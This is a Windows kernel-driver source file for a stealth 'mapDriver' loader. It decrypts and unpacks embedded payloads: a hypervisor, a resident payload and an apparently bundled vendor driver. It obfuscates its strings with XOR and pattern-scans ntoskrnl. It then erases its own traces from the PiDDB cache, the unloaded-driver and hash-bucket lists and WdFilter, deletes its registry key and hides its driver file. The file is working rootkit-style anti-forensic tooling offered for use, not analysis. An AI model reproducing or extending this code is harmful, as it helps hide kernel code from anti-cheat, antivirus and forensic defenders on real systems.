#include "base.h"
#include "fltKernel.h"
#include <intrin.h>

#include "Utils.h"
#include "vt/hv.h"
#include "common/ntutils.h"
#include "common/hypervisor_payload.h"
#include "common/payload_abi.h"
#include "common/mapctl_ioctl.h"
#include "common/resident_payload.h"
#include "common/machenike_payload.h"
#include "fake/filer.h"
#include "poolmanager/PoolManager.h"
#if MAPDRIVER_DRIVER_FILE_HIDE_ENABLED
#include "fake/hr.h"
#endif
#include "trace/trace.hpp"

extern "C" NTSTATUS NTAPI MmCopyVirtualMemory(
    PEPROCESS SourceProcess,
    PVOID SourceAddress,
    PEPROCESS TargetProcess,
    PVOID TargetAddress,
    SIZE_T BufferSize,
    KPROCESSOR_MODE PreviousMode,
    PSIZE_T ReturnSize);

typedef NTSTATUS(NTAPI* PRTL_DECOMPRESS_BUFFER)(
    USHORT CompressionFormat,
    PUCHAR UncompressedBuffer,
    ULONG UncompressedBufferSize,
    PUCHAR CompressedBuffer,
    ULONG CompressedBufferSize,
    PULONG FinalUncompressedSize);

enum mapdriver_unpack_buffer_kind : ULONG
{
    MAPDRIVER_UNPACK_BUFFER_NONE = 0,
    MAPDRIVER_UNPACK_BUFFER_INDEPENDENT = 1,
    MAPDRIVER_UNPACK_BUFFER_POOL = 2,
};

static volatile LONG g_testdriver_unpack_kind = MAPDRIVER_UNPACK_BUFFER_NONE;
static volatile LONG g_payload_image_unpack_kind = MAPDRIVER_UNPACK_BUFFER_NONE;
static volatile LONG g_machenike_unpack_kind = MAPDRIVER_UNPACK_BUFFER_NONE;

static volatile LONG g_payload_detached = 0;
static PDRIVER_OBJECT g_host_driver_object = nullptr;
static PDEVICE_OBJECT g_control_device = nullptr;
static UNICODE_STRING g_control_symlink = {};

static WCHAR g_trace_driver_name[64] = {};
static payload_u64 g_trace_driver_name_bytes = 0;
static payload_u64 g_trace_mm_unloaded_drivers = 0;
static payload_u64 g_trace_mm_last_unloaded_driver = 0;
static payload_u64 g_trace_hash_bucket_list = 0;
static payload_u64 g_trace_hash_cache_lock = 0;

static constexpr payload_u64 YVT_BOOT_MAGIC = 0x595654424F4F5431ull; // YVTBOOT1
static constexpr payload_u64 YVT_BOOT_FLAG_KEEP_HV_ON_UNLOAD = 0x00000001ull;
static constexpr payload_u64 YVT_BOOT_FLAG_EXTERNAL_STATE = 0x00000004ull;

struct yvt_boot_context
{
    payload_u64 magic;
    payload_u64 size;
    payload_u64 flags;
    payload_u64 status;
    payload_u64 state_arena;
    payload_u64 state_arena_size;
    payload_u64 state_arena_used;
    payload_u64 mm_allocate_independent_pages;
    payload_u64 mm_free_independent_pages;
    payload_u64 mm_set_page_protection;
};

static payload_u64 g_yvt_state_arena_used = 0;
static payload_u64 g_testdriver_boot_flags_ptr = 0;

static constexpr payload_u64 MAPDRIVER_HV_DIAG_BASE_BYTES =
    MAPCTL_HV_DIAG_BASE_U64_COUNT * sizeof(payload_u64);

static bool mapdriver_hv_diag_valid(const mapctl_hv_diag& diag, payload_u64 copied)
{
    return copied >= MAPDRIVER_HV_DIAG_BASE_BYTES &&
        diag.magic == MAPCTL_HV_DIAG_MAGIC &&
        diag.size >= MAPDRIVER_HV_DIAG_BASE_BYTES;
}

static bool mapdriver_va_in_range(payload_u64 va, payload_u64 base, payload_u64 size, payload_u64 bytes)
{
    if (!va || !base || !size || !bytes)
        return false;

    payload_u64 end = va + bytes;
    if (end < va)
        return false;

    payload_u64 range_end = base + size;
    if (range_end < base)
        return false;

    return va >= base && end <= range_end;
}

static bool mapdriver_va_in_testdriver_image(payload_u64 va, payload_u64 bytes = sizeof(payload_u64))
{
    return mapdriver_va_in_range(
        va,
        (payload_u64)Utils::imageBase,
        (payload_u64)Utils::imageSize,
        bytes);
}

static void mapdriver_cache_testdriver_boot_flags_ptr(const mapctl_hv_diag& diag)
{
    payload_u64 ptr = diag.yvt_boot_flags_ptr;
    if (!mapdriver_va_in_testdriver_image(ptr))
        return;

    if (g_testdriver_boot_flags_ptr != ptr)
    {
        LOG_DEBUG(_XOR_("[mapDriver] cached TestDriver boot flags ptr=%p\n"), (PVOID)ptr);
        g_testdriver_boot_flags_ptr = ptr;
    }
}

static void mapdriver_normalize_hv_diag(mapctl_hv_diag& diag)
{
    // New TestDriver fills ghv_size directly.  For older/intermediate VT
    // builds that already moved ghv/vt_hook_table into the resident arena but
    // forgot the tail ghv_size field, infer the resident ghv allocation from
    // the next carved block.  User evidence:
    //   ghv=...FFA00000, vt_hook=...01120000 => delta 0x1720000.
    if (!diag.ghv_size &&
        diag.ghv &&
        diag.vt_hook_table_ptr > diag.ghv)
    {
        payload_u64 inferred = diag.vt_hook_table_ptr - diag.ghv;
        if (inferred >= PAGE_SIZE &&
            inferred <= 0x4000000ull &&
            ((inferred & (PAGE_SIZE - 1)) == 0))
        {
            diag.ghv_size = inferred;
        }
    }

    if (!diag.vt_hook_table_bytes &&
        diag.vt_hook_slot_count &&
        diag.vt_hook_slot_size &&
        diag.vt_hook_slot_count <= 0x1000ull &&
        diag.vt_hook_slot_size <= 0x1000ull)
    {
        diag.vt_hook_table_bytes =
            diag.vt_hook_slot_count * diag.vt_hook_slot_size;
    }
}

static bool mapdriver_hv_diag_migration_ready(const mapctl_hv_diag& diag)
{
    payload_u64 vt_bytes = diag.vt_hook_table_bytes;
    if (!vt_bytes &&
        diag.vt_hook_slot_count &&
        diag.vt_hook_slot_size &&
        diag.vt_hook_slot_count <= 0x1000ull &&
        diag.vt_hook_slot_size <= 0x1000ull)
    {
        vt_bytes = diag.vt_hook_slot_count * diag.vt_hook_slot_size;
    }

    return diag.ghv &&
        diag.ghv_size >= PAGE_SIZE &&
        diag.ghv_size <= 0x4000000ull &&
        diag.vt_hook_table_ptr &&
        vt_bytes &&
        diag.vcpu_count &&
        diag.vmcs_host_rip &&
        diag.vmcs_host_rsp &&
        diag.vm_exit &&
        diag.handle_vm_exit;
}

static void mapdriver_delete_control_device();
static void mapdriver_restore_host_rsp(mapctl_host_rsp_switch* req);
static void mapdriver_restore_host_rip(mapctl_host_rip_switch* req);

static void mapdriver_wait_ms(LONG milliseconds)
{
    if (milliseconds <= 0)
        return;

    LARGE_INTEGER delay = {};
    delay.QuadPart = -(LONGLONG)milliseconds * 10000LL;
    KeDelayExecutionThread(KernelMode, FALSE, &delay);
}

static PRTL_DECOMPRESS_BUFFER mapdriver_resolve_decompress()
{
    UNICODE_STRING routine = { 0 };
    RtlInitUnicodeString(&routine, _XOR_(L"RtlDecompressBuffer"));
    return (PRTL_DECOMPRESS_BUFFER)MmGetSystemRoutineAddress(&routine);
}

static PUCHAR mapdriver_alloc_scratch_buffer(ULONG size)
{
#if MAPDRIVER_FORCE_EXALLOCPOOL
    if (!size)
        return nullptr;

    PUCHAR buffer = (PUCHAR)ExAllocatePoolWithTag(MAPDRIVER_FORCE_EXALLOCPOOL_TYPE, size, MEM_TAG);
    if (!buffer)
        return nullptr;

    __try
    {
        volatile UCHAR* touch = (volatile UCHAR*)buffer;
        for (ULONG off = 0; off < size; off += PAGE_SIZE)
            touch[off] = 0;
        touch[size - 1] = 0;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        ExFreePoolWithTag(buffer, MEM_TAG);
        return nullptr;
    }

    RtlZeroMemory(buffer, size);
    return buffer;
#else
    if (!size || !MmAllocateIndependentPages || !MmFreeIndependentPages || !MmSetPageProtection)
        return nullptr;

    PUCHAR buffer = (PUCHAR)MmAllocateIndependentPages(size, MAXULONG64);
    if (!buffer)
        return nullptr;

    if (!MmSetPageProtection(buffer, size, PAGE_READWRITE))
    {
        MmFreeIndependentPages(buffer, size);
        return nullptr;
    }

    RtlZeroMemory(buffer, size);
    return buffer;
#endif
}

static PUCHAR mapdriver_alloc_unpack_buffer(ULONG size, ULONG* kind_out)
{
    if (kind_out)
        *kind_out = MAPDRIVER_UNPACK_BUFFER_NONE;

    if (!size)
        return nullptr;

#if !MAPDRIVER_FORCE_EXALLOCPOOL
    if (MmAllocateIndependentPages && MmFreeIndependentPages && MmSetPageProtection)
    {
        PUCHAR buffer = (PUCHAR)MmAllocateIndependentPages(size, MAXULONG64);
        if (buffer)
        {
            if (MmSetPageProtection(buffer, size, PAGE_READWRITE))
            {
                RtlZeroMemory(buffer, size);
                if (kind_out)
                    *kind_out = MAPDRIVER_UNPACK_BUFFER_INDEPENDENT;
                return buffer;
            }

            MmFreeIndependentPages(buffer, size);
        }
    }

    // Physical-machine policy: no ExAllocatePool fallback for unpack buffers.
    return nullptr;
#else
    PUCHAR buffer = (PUCHAR)ExAllocatePoolWithTag(MAPDRIVER_FORCE_EXALLOCPOOL_TYPE, size, MEM_TAG);
    if (!buffer)
        return nullptr;

    RtlZeroMemory(buffer, size);
    if (kind_out)
        *kind_out = MAPDRIVER_UNPACK_BUFFER_POOL;
    return buffer;
#endif
}

static void mapdriver_free_unpack_buffer(PUCHAR buffer, ULONG size, ULONG kind)
{
    if (!buffer)
        return;

    RtlSecureZeroMemory(buffer, size);
    if (kind == MAPDRIVER_UNPACK_BUFFER_INDEPENDENT)
    {
        if (MmFreeIndependentPages)
            MmFreeIndependentPages(buffer, size);
        return;
    }

    if (kind == MAPDRIVER_UNPACK_BUFFER_POOL)
    {
        ExFreePoolWithTag(buffer, MEM_TAG);
        return;
    }
}

static NTSTATUS mapdriver_try_decompress(
    PRTL_DECOMPRESS_BUFFER decompress,
    USHORT compression_format,
    PUCHAR uncompressed_buffer,
    ULONG uncompressed_buffer_size,
    PUCHAR compressed_buffer,
    ULONG compressed_buffer_size,
    PULONG final_uncompressed_size,
    ULONG* exception_code)
{
    if (exception_code)
        *exception_code = 0;

    if (!decompress)
        return STATUS_INVALID_PARAMETER;

    NTSTATUS status = STATUS_UNSUCCESSFUL;
    __try
    {
        status = decompress(
            compression_format,
            uncompressed_buffer,
            uncompressed_buffer_size,
            compressed_buffer,
            compressed_buffer_size,
            final_uncompressed_size);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        if (exception_code)
            *exception_code = 1;
        return STATUS_UNSUCCESSFUL;
    }

    return status;
}

static void mapdriver_free_scratch_buffer(PUCHAR buffer, ULONG size)
{
    if (!buffer)
        return;

    RtlSecureZeroMemory(buffer, size);
#if MAPDRIVER_FORCE_EXALLOCPOOL
    ExFreePoolWithTag(buffer, MEM_TAG);
#else
    if (MmFreeIndependentPages)
        MmFreeIndependentPages(buffer, size);
#endif
}

static bool mapdriver_ensure_payload_arena()
{
#if MAPDRIVER_PAYLOAD_ARENA_SIZE
    if (Utils::payloadArenaBase && Utils::payloadArenaSize)
        return true;

    Utils::payloadArenaBase = mapdriver_alloc_scratch_buffer(MAPDRIVER_PAYLOAD_ARENA_SIZE);
    Utils::payloadArenaSize = Utils::payloadArenaBase ? MAPDRIVER_PAYLOAD_ARENA_SIZE : 0;
    if (!Utils::payloadArenaBase || !Utils::payloadArenaSize)
    {
        LOG_DEBUG(_XOR_("[mapDriver] resident arena alloc failed size=0x%X\n"),
            (ULONG)MAPDRIVER_PAYLOAD_ARENA_SIZE);
        return false;
    }

    g_yvt_state_arena_used = 0;
    LOG_DEBUG(_XOR_("[mapDriver] resident arena ready base=%p size=0x%X\n"),
        Utils::payloadArenaBase, Utils::payloadArenaSize);
    return true;
#else
    return false;
#endif
}

static payload_u64 mapdriver_get_resident_hv_diag(mapctl_hv_diag* out)
{
    if (!out)
        return 0;

    RtlZeroMemory(out, sizeof(*out));

    payload_u64 copied = 0;
    __try
    {
        copied = hv::vmcall_get_resident_hv_diag(out, sizeof(*out));
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        copied = 0;
    }

    if (mapdriver_hv_diag_valid(*out, copied))
    {
        mapdriver_normalize_hv_diag(*out);
        mapdriver_cache_testdriver_boot_flags_ptr(*out);
        if (mapdriver_hv_diag_migration_ready(*out))
            return copied;
    }

    // Some VM-exit paths cannot translate the caller's kernel stack VA with
    // the current guest CR3/KVA-shadow view.  A subtler variant can fill only
    // the first part of a stack-local mapctl_hv_diag when the struct crosses a
    // physical page boundary: the base magic/rip/rsp fields look valid, but
    // later migration-critical fields such as vt_hook_table_ptr/ghv_size stay
    // zero.  Retry from a single page-owned scratch buffer so the full 0x630
    // diagnostic record lives in one translated page before legacy detach.
    PUCHAR scratch = mapdriver_alloc_scratch_buffer(PAGE_SIZE);
    if (!scratch)
        return copied;

    RtlZeroMemory(scratch, PAGE_SIZE);
    payload_u64 scratch_copied = 0;
    __try
    {
        scratch_copied = hv::vmcall_get_resident_hv_diag(scratch, sizeof(*out));
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        scratch_copied = 0;
    }

    if (scratch_copied)
    {
        RtlCopyMemory(out, scratch, sizeof(*out));
        copied = scratch_copied;
        if (mapdriver_hv_diag_valid(*out, copied))
        {
            mapdriver_normalize_hv_diag(*out);
            mapdriver_cache_testdriver_boot_flags_ptr(*out);
        }
    }

    mapdriver_free_scratch_buffer(scratch, PAGE_SIZE);
    if (!mapdriver_hv_diag_valid(*out, copied))
        RtlZeroMemory(out, sizeof(*out));
    return copied;
}

static bool mapdriver_unpack_test_sys(PUCHAR* out_buffer, ULONG* out_size)
{
    if (!out_buffer || !out_size)
        return false;

    *out_buffer = nullptr;
    *out_size = 0;

    // This identity is generated from the exact VtHypervisor.sys that was
    // embedded.  It makes stale Bootstrap/inner-HV mismatches visible in the
    // kernel log before any SVM state is changed.
    LOG_DEBUG(_XOR_("[mapDriver] TestDriver embedded identity sha256=%s unpacked=0x%X packed=0x%X\n"),
        HYPERVISOR_PAYLOAD_SHA256,
        HYPERVISOR_PAYLOAD_UNPACKED_SIZE,
        HYPERVISOR_PAYLOAD_PACKED_SIZE);

    test_sys_crypt();

#if HYPERVISOR_PAYLOAD_COMPRESSED
    ULONG alloc_kind = MAPDRIVER_UNPACK_BUFFER_NONE;
    PUCHAR plain = mapdriver_alloc_unpack_buffer(HYPERVISOR_PAYLOAD_UNPACKED_SIZE, &alloc_kind);
    if (!plain)
    {
        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack alloc failed size=0x%X indep=%p free=%p prot=%p\n"),
            HYPERVISOR_PAYLOAD_UNPACKED_SIZE, MmAllocateIndependentPages, MmFreeIndependentPages, MmSetPageProtection);
        return false;
    }

    auto decompress = mapdriver_resolve_decompress();
    if (!decompress)
    {
        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack decompress missing alloc=%u size=0x%X packed=0x%X\n"),
            alloc_kind, HYPERVISOR_PAYLOAD_UNPACKED_SIZE, (ULONG)sizeof(test_sys));
        mapdriver_free_unpack_buffer(plain, HYPERVISOR_PAYLOAD_UNPACKED_SIZE, alloc_kind);
        return false;
    }

    ULONG final_size = 0;
    ULONG exception_code = 0;
    NTSTATUS status = mapdriver_try_decompress(
        decompress,
        HYPERVISOR_PAYLOAD_COMPRESSION_FORMAT,
        plain,
        HYPERVISOR_PAYLOAD_UNPACKED_SIZE,
        test_sys,
        (ULONG)sizeof(test_sys),
        &final_size,
        &exception_code);

    LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X decompress=%p exc=0x%X\n"),
        alloc_kind,
        status,
        final_size,
        HYPERVISOR_PAYLOAD_UNPACKED_SIZE,
        (ULONG)sizeof(test_sys),
        plain[0],
        plain[1],
        decompress,
        exception_code);

    if (!NT_SUCCESS(status) || final_size != HYPERVISOR_PAYLOAD_UNPACKED_SIZE || plain[0] != 'M' || plain[1] != 'Z')
    {
        mapdriver_free_unpack_buffer(plain, HYPERVISOR_PAYLOAD_UNPACKED_SIZE, alloc_kind);
        return false;
    }

    InterlockedExchange(&g_testdriver_unpack_kind, (LONG)alloc_kind);
    *out_buffer = plain;
    *out_size = HYPERVISOR_PAYLOAD_UNPACKED_SIZE;
    return true;
#else
    *out_buffer = (PUCHAR)test_sys;
    *out_size = (ULONG)sizeof(test_sys);
    return true;
#endif
}

static void mapdriver_release_test_sys(PUCHAR buffer, ULONG size)
{
#if HYPERVISOR_PAYLOAD_COMPRESSED
    UNREFERENCED_PARAMETER(size);
    ULONG kind = (ULONG)InterlockedExchange(&g_testdriver_unpack_kind, MAPDRIVER_UNPACK_BUFFER_NONE);
    mapdriver_free_unpack_buffer(buffer, HYPERVISOR_PAYLOAD_UNPACKED_SIZE, kind);
#else
    UNREFERENCED_PARAMETER(buffer);
    UNREFERENCED_PARAMETER(size);
#endif
}

static bool mapdriver_unpack_payload_image(PUCHAR* out_buffer, ULONG* out_size)
{
    if (!out_buffer || !out_size)
        return false;

    *out_buffer = nullptr;
    *out_size = 0;

    LOG_DEBUG(_XOR_("[mapDriver] ResidentPayload embedded identity sha256=%s source_pe_size=0x%X unpacked=0x%X packed=0x%X\n"),
        PAYLOAD_IMAGE_SOURCE_PE_SHA256,
        PAYLOAD_IMAGE_SOURCE_PE_SIZE,
        PAYLOAD_IMAGE_UNPACKED_SIZE,
        PAYLOAD_IMAGE_PACKED_SIZE);

    payload_image_crypt();

#if PAYLOAD_IMAGE_COMPRESSED
    ULONG alloc_kind = MAPDRIVER_UNPACK_BUFFER_NONE;
    PUCHAR plain = mapdriver_alloc_unpack_buffer(PAYLOAD_IMAGE_UNPACKED_SIZE, &alloc_kind);
    if (!plain)
    {
        LOG_DEBUG(_XOR_("[mapDriver] payload image unpack alloc failed size=0x%X indep=%p free=%p prot=%p\n"),
            PAYLOAD_IMAGE_UNPACKED_SIZE, MmAllocateIndependentPages, MmFreeIndependentPages, MmSetPageProtection);
        return false;
    }

    auto decompress = mapdriver_resolve_decompress();
    if (!decompress)
    {
        LOG_DEBUG(_XOR_("[mapDriver] payload image unpack decompress missing alloc=%u size=0x%X packed=0x%X\n"),
            alloc_kind, PAYLOAD_IMAGE_UNPACKED_SIZE, (ULONG)sizeof(payload_image_blob));
        mapdriver_free_unpack_buffer(plain, PAYLOAD_IMAGE_UNPACKED_SIZE, alloc_kind);
        return false;
    }

    ULONG final_size = 0;
    ULONG exception_code = 0;
    NTSTATUS status = mapdriver_try_decompress(
        decompress,
        PAYLOAD_IMAGE_COMPRESSION_FORMAT,
        plain,
        PAYLOAD_IMAGE_UNPACKED_SIZE,
        payload_image_blob,
        (ULONG)sizeof(payload_image_blob),
        &final_size,
        &exception_code);
    LOG_DEBUG(_XOR_("[mapDriver] payload image unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X decompress=%p exc=0x%X\n"),
        alloc_kind,
        status,
        final_size,
        PAYLOAD_IMAGE_UNPACKED_SIZE,
        (ULONG)sizeof(payload_image_blob),
        plain[0],
        plain[1],
        decompress,
        exception_code);

    bool payload_format_ok = false;
#if PAYLOAD_IMAGE_FORMAT == PAYLOAD_IMAGE_FORMAT_RAWPACK
    ULONGLONG raw_magic = 0;
    if (final_size >= sizeof(raw_magic))
        RtlCopyMemory(&raw_magic, plain, sizeof(raw_magic));
    payload_format_ok = (raw_magic == 0x504C445241573031ull); // PLDRAW01
#else
    payload_format_ok = (plain[0] == 'M' && plain[1] == 'Z');
#endif

    if (!NT_SUCCESS(status) || final_size != PAYLOAD_IMAGE_UNPACKED_SIZE || !payload_format_ok)
    {
        mapdriver_free_unpack_buffer(plain, PAYLOAD_IMAGE_UNPACKED_SIZE, alloc_kind);
        return false;
    }

    InterlockedExchange(&g_payload_image_unpack_kind, (LONG)alloc_kind);
    *out_buffer = plain;
    *out_size = PAYLOAD_IMAGE_UNPACKED_SIZE;
    return true;
#else
    *out_buffer = (PUCHAR)payload_image_blob;
    *out_size = (ULONG)sizeof(payload_image_blob);
    return true;
#endif
}

static void mapdriver_release_payload_image(PUCHAR buffer, ULONG size)
{
#if PAYLOAD_IMAGE_COMPRESSED
    UNREFERENCED_PARAMETER(size);
    ULONG kind = (ULONG)InterlockedExchange(&g_payload_image_unpack_kind, MAPDRIVER_UNPACK_BUFFER_NONE);
    mapdriver_free_unpack_buffer(buffer, PAYLOAD_IMAGE_UNPACKED_SIZE, kind);
#else
    UNREFERENCED_PARAMETER(buffer);
    UNREFERENCED_PARAMETER(size);
#endif
}

static bool mapdriver_unpack_machenike_sys(PUCHAR* out_buffer, ULONG* out_size)
{
    if (!out_buffer || !out_size)
        return false;

    *out_buffer = nullptr;
    *out_size = 0;

    LOG_DEBUG(_XOR_("[mapDriver] Machenike embedded identity sha256=%s unpacked=0x%X packed=0x%X\n"),
        MACHENIKE_SYS_SHA256,
        MACHENIKE_SYS_UNPACKED_SIZE,
        MACHENIKE_SYS_PACKED_SIZE);

    machenike_sys_crypt();

#if MACHENIKE_SYS_COMPRESSED
    ULONG alloc_kind = MAPDRIVER_UNPACK_BUFFER_NONE;
    PUCHAR plain = mapdriver_alloc_unpack_buffer(MACHENIKE_SYS_UNPACKED_SIZE, &alloc_kind);
    if (!plain)
    {
        LOG_DEBUG(_XOR_("[mapDriver] Machenike unpack alloc failed size=0x%X\n"), MACHENIKE_SYS_UNPACKED_SIZE);
        return false;
    }

    auto decompress = mapdriver_resolve_decompress();
    if (!decompress)
    {
        mapdriver_free_unpack_buffer(plain, MACHENIKE_SYS_UNPACKED_SIZE, alloc_kind);
        return false;
    }

    ULONG final_size = 0;
    ULONG exception_code = 0;
    NTSTATUS status = mapdriver_try_decompress(
        decompress,
        MACHENIKE_SYS_COMPRESSION_FORMAT,
        plain,
        MACHENIKE_SYS_UNPACKED_SIZE,
        machenike_sys,
        (ULONG)sizeof(machenike_sys),
        &final_size,
        &exception_code);

    LOG_DEBUG(_XOR_("[mapDriver] Machenike unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X exc=0x%X\n"),
        alloc_kind, status, final_size, MACHENIKE_SYS_UNPACKED_SIZE, (ULONG)sizeof(machenike_sys),
        plain[0], plain[1], exception_code);

    if (!NT_SUCCESS(status) || final_size != MACHENIKE_SYS_UNPACKED_SIZE || plain[0] != 'M' || plain[1] != 'Z')
    {
        mapdriver_free_unpack_buffer(plain, MACHENIKE_SYS_UNPACKED_SIZE, alloc_kind);
        return false;
    }

    InterlockedExchange(&g_machenike_unpack_kind, (LONG)alloc_kind);
    *out_buffer = plain;
    *out_size = MACHENIKE_SYS_UNPACKED_SIZE;
    return true;
#else
    *out_buffer = (PUCHAR)machenike_sys;
    *out_size = (ULONG)sizeof(machenike_sys);
    return true;
#endif
}

static void mapdriver_release_machenike_sys(PUCHAR buffer, ULONG size)
{
#if MACHENIKE_SYS_COMPRESSED
    UNREFERENCED_PARAMETER(size);
    ULONG kind = (ULONG)InterlockedExchange(&g_machenike_unpack_kind, MAPDRIVER_UNPACK_BUFFER_NONE);
    mapdriver_free_unpack_buffer(buffer, MACHENIKE_SYS_UNPACKED_SIZE, kind);
#else
    UNREFERENCED_PARAMETER(buffer);
    UNREFERENCED_PARAMETER(size);
#endif
}

static PCWSTR mapdriver_driver_name(PDRIVER_OBJECT driver_object)
{
    if (!driver_object || !driver_object->DriverSection)
        return L"";

    auto ldr = (PKLDR_DATA_TABLE_ENTRY)driver_object->DriverSection;
    return ldr->BaseDllName.Buffer ? ldr->BaseDllName.Buffer : L"";
}

static void mapdriver_cache_trace_driver_name(PCWSTR driver_name)
{
    RtlZeroMemory(g_trace_driver_name, sizeof(g_trace_driver_name));
    g_trace_driver_name_bytes = 0;

    if (!driver_name || !driver_name[0])
        return;

    SIZE_T chars = 0;
    while (driver_name[chars] && chars < RTL_NUMBER_OF(g_trace_driver_name) - 1)
    {
        g_trace_driver_name[chars] = driver_name[chars];
        ++chars;
    }
    g_trace_driver_name[chars] = 0;
    g_trace_driver_name_bytes = (payload_u64)(chars * sizeof(WCHAR));
}

static bool mapdriver_find_unloaded_driver_globals(payload_u64* unloaded_drivers_global,
                                                   payload_u64* last_unloaded_driver_global)
{
    if (unloaded_drivers_global)
        *unloaded_drivers_global = 0;
    if (last_unloaded_driver_global)
        *last_unloaded_driver_global = 0;

    unsigned long long ntoskrnl_address = 0;
    unsigned long ntoskrnl_size = 0;
    utils::get_module_base_address(_XOR_("ntoskrnl.exe"), ntoskrnl_address, ntoskrnl_size);
    if (!ntoskrnl_address || !ntoskrnl_size)
        return false;

    unsigned long long unloaded = utils::find_pattern_image(ntoskrnl_address,
        "\x4C\x8B\x15\x00\x00\x00\x00\x4C\x8B\xC9",
        "xxx????xxx");
    if (!unloaded)
        return false;
    unloaded = reinterpret_cast<unsigned long long>(
        reinterpret_cast<char*>(unloaded) + 7 +
        *reinterpret_cast<int*>(reinterpret_cast<char*>(unloaded) + 3));

    unsigned long long last = utils::find_pattern_image(ntoskrnl_address,
        "\x8B\x05\x00\x00\x00\x00\x83\xF8\x32",
        "xx????xxx");
    if (!last)
        return false;
    last = reinterpret_cast<unsigned long long>(
        reinterpret_cast<char*>(last) + 6 +
        *reinterpret_cast<int*>(reinterpret_cast<char*>(last) + 2));

    if (unloaded_drivers_global)
        *unloaded_drivers_global = (payload_u64)unloaded;
    if (last_unloaded_driver_global)
        *last_unloaded_driver_global = (payload_u64)last;
    return unloaded && last;
}

static bool mapdriver_find_hash_bucket_globals(payload_u64* hash_bucket_list,
                                               payload_u64* hash_cache_lock)
{
    if (hash_bucket_list)
        *hash_bucket_list = 0;
    if (hash_cache_lock)
        *hash_cache_lock = 0;

    trace::hash_bucket_globals globals = {};
    if (!trace::resolve_hash_bucket_globals(&globals))
        return false;

    if (hash_bucket_list)
        *hash_bucket_list = (payload_u64)globals.hash_bucket_list;
    if (hash_cache_lock)
        *hash_cache_lock = (payload_u64)globals.hash_cache_lock;
    return globals.hash_bucket_list && globals.hash_cache_lock;
}

static void mapdriver_prepare_unload_trace_handoff(payload_boot_context* ctx)
{
    if (!ctx)
        return;

    if (!g_trace_mm_unloaded_drivers || !g_trace_mm_last_unloaded_driver)
        mapdriver_find_unloaded_driver_globals(&g_trace_mm_unloaded_drivers, &g_trace_mm_last_unloaded_driver);
    if (!g_trace_hash_bucket_list || !g_trace_hash_cache_lock)
        mapdriver_find_hash_bucket_globals(&g_trace_hash_bucket_list, &g_trace_hash_cache_lock);

    ctx->trace_unload_mm_unloaded_drivers = g_trace_mm_unloaded_drivers;
    ctx->trace_unload_mm_last_unloaded_driver = g_trace_mm_last_unloaded_driver;
    ctx->trace_unload_name_bytes = g_trace_driver_name_bytes;
    ctx->trace_unload_delay_exits = 8192;
    ctx->trace_unload_interval_exits = 4096;
    ctx->trace_unload_max_attempts = 512;
    RtlZeroMemory(ctx->trace_unload_name_qwords, sizeof(ctx->trace_unload_name_qwords));
    if (g_trace_driver_name_bytes)
    {
        SIZE_T copy = (SIZE_T)g_trace_driver_name_bytes;
        if (copy > sizeof(ctx->trace_unload_name_qwords))
            copy = sizeof(ctx->trace_unload_name_qwords);
        RtlCopyMemory(ctx->trace_unload_name_qwords, g_trace_driver_name, copy);
    }
    ctx->trace_hash_bucket_list = g_trace_hash_bucket_list;
    ctx->trace_hash_cache_lock = g_trace_hash_cache_lock;
    ctx->trace_hash_delay_exits = 8192;
    ctx->trace_hash_interval_exits = 4096;
    ctx->trace_hash_max_attempts = 512;

    LOG_DEBUG(_XOR_("[mapDriver] trace handoff name=%ws bytes=0x%llX mmunld=0x%llX last=0x%llX hash=0x%llX lock=0x%llX\n"),
        g_trace_driver_name,
        ctx->trace_unload_name_bytes,
        ctx->trace_unload_mm_unloaded_drivers,
        ctx->trace_unload_mm_last_unloaded_driver,
        ctx->trace_hash_bucket_list,
        ctx->trace_hash_cache_lock);
}

static void mapdriver_clear_traces(PCWSTR driver_name, bool include_filter_runtime)
{
#if MAPDRIVER_TRACE_CLEAN_ENABLED
    if (!driver_name || !driver_name[0])
        return;

    constexpr ULONG kTraceDriverStamp = 0x63E6046A;
    bool piddb_ok = trace::clear_cache(driver_name, kTraceDriverStamp);
    bool unload_ok = trace::clear_unloaded_driver(driver_name);
    bool hash_ok = trace::clear_hash_bucket_list(driver_name);
    LOG_DEBUG(_XOR_("[mapDriver] trace clean name=%ws stamp=0x%X piddb=%d unld=%d hash=%d filter=%d\n"),
        driver_name,
        kTraceDriverStamp,
        (int)piddb_ok,
        (int)unload_ok,
        (int)hash_ok,
        (int)include_filter_runtime);

    if (include_filter_runtime)
        trace::clear_wdfilter_runtime_drivers(driver_name);
#else
    UNREFERENCED_PARAMETER(driver_name);
    UNREFERENCED_PARAMETER(include_filter_runtime);
#endif
}

static bool mapdriver_delete_registry_key(PUNICODE_STRING registry_path)
{
#if MAPDRIVER_REGISTRY_DELETE_ENABLED
    if (!registry_path)
        return false;

    OBJECT_ATTRIBUTES oa = { 0 };
    InitializeObjectAttributes(
        &oa,
        registry_path,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL,
        NULL);

    HANDLE key = NULL;
    NTSTATUS status = ZwOpenKey(&key, DELETE, &oa);
    if (!NT_SUCCESS(status))
        return false;

    status = ZwDeleteKey(key);
    ZwClose(key);
    return NT_SUCCESS(status);
#else
    UNREFERENCED_PARAMETER(registry_path);
    return false;
#endif
}

#if MAPDRIVER_DRIVER_FILE_HIDE_ENABLED
static void mapdriver_hide_driver_file(PDRIVER_OBJECT driver_object)
{
    if (!driver_object)
        return;

    fake_hr_crypt();

    HideDriverFile(driver_object, (PUCHAR)data, sizeof(data));
    RtlSecureZeroMemory(data, sizeof(data));
}
#endif

struct mapdriver_hv_probe_context
{
    BOOLEAN completed;
    BOOLEAN ready;
};

static VOID mapdriver_hv_probe_callout(PVOID parameter)
{
    auto ctx = static_cast<mapdriver_hv_probe_context*>(parameter);
    if (!ctx)
        return;

    __try
    {
        ctx->ready = (hv::ping() == hv::hypervisor_signature) ? TRUE : FALSE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        ctx->ready = FALSE;
    }

    ctx->completed = TRUE;
}

